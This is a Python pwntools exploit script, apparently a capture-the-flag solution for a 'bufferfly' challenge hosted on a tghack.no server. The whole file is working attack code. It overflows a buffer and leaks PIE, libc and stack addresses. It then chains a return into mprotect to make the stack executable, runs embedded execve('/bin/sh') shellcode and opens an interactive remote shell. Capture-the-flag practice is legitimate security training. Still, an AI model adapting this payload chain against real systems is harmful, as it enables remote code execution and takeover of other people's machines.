from pwn import *
elf = ELF('./bufferfly', checksec=False)
libc = ELF('./libc6-i386_2.27-3ubuntu1_amd64.so', checksec=False)

#p = elf.process()
p = remote('bufferfly.tghack.no', 6002)
p.sendline(b''.join([
    b'A'*17,    # char words[17];
    p8(0),      # bool bubble;
    p16(25)     # int characteristics;
])) # bufferfly:76

leak_addr = eval(p.recvline_endswith('!').split()[-1][:-1])
log.info(f'leak &supersecret_base at 0x{leak_addr:x}')
elf.address = leak_addr - elf.sym['supersecret_base']
log.success(f'pie base at 0x{elf.address:x}')

p.sendlineafter(b'now?', b''.join([
    b'B'*0x20,
    p32(leak_addr),
]))

# get libc base from mprotect
p.sendlineafter(b'for?', b'mprotec')
leak_addr = eval(p.recvline_contains('fact:').split()[-1][:-1])
log.info(f'leak &mprotect at 0x{leak_addr:x}')
# actually, we dont really need to calculate libc base
libc.address = leak_addr - libc.sym['mprotect']
log.success(f'libc base at 0x{libc.address:x}')


# get stack address
p.sendlineafter(b'done?', b'\nmattac')
leak_addr = eval(p.recvline_contains('here:').split(b'. ')[0].split()[-1])
log.success(f'leak var &buf at 0x{leak_addr:x}')

payload = b''.join([
    b'done\x00',
    b'A'*79,        # buffer padding
    
    # make stack address to rwx with mprotect
    p32(libc.sym['mprotect']),
    p32(leak_addr + (
        60+ # &buf size
        12+ # &done size
         4+ # return addr
         4+ # leak_addr
         4+ # mprotect arg[1] => stack base addr
         4+ # mprotect arg[2] => 0x1000
         4  # mprotect arg[3] => 0x7 => PROT_EXEC|PROT_WRITE|PROT_READ
        )),                                 # return to shellcode shellcode address
    p32(eval(hex(leak_addr)[:-3] + '000')), # base address of stack
    p32(0x1000),
    p32(0x7),
    # shellcode goes here
    b'\x90'*5 + b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
])
p.sendlineafter(b'done?', payload)
p.interactive()